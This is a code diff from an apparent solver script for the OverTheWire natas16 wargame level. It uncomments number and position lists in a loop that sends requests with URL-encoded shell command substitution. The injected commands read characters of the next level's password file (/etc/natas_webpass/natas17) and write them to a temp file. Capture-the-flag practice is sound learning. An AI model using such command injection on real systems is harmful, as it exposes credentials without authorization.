@@ -86,10 +86,10 @@ final_password_letters = ['E', 'q', 'j', 'h', 'j', 'b', 'o', '<NUM>', 'L', 'F', 
 # like before, it will return the whole dictionary if not present, else nothing, that's what we're aiming for
 
 
-# possible_numbers = [0, 5, 7, 8, 9]
-#
-# number_positions = [8, 13, 19, 21, 22, 27, 30] # remember these are 1 more than the index value in the password_letters list due to linux file indices being 1-indexed
-#
+possible_numbers = [0, 5, 7, 8, 9]
+
+number_positions = [8, 13, 19, 21, 22, 27, 30] # remember these are 1 more than the index value in the password_letters list due to linux file indices being 1-indexed
+
 for number in number_positions:
     url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28echo+%24%28cut+-c{number}+%2Fetc%2Fnatas_webpass%2Fnatas17%29+%3E+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
     requests.post(url, auth=('natas16', n16_pass))
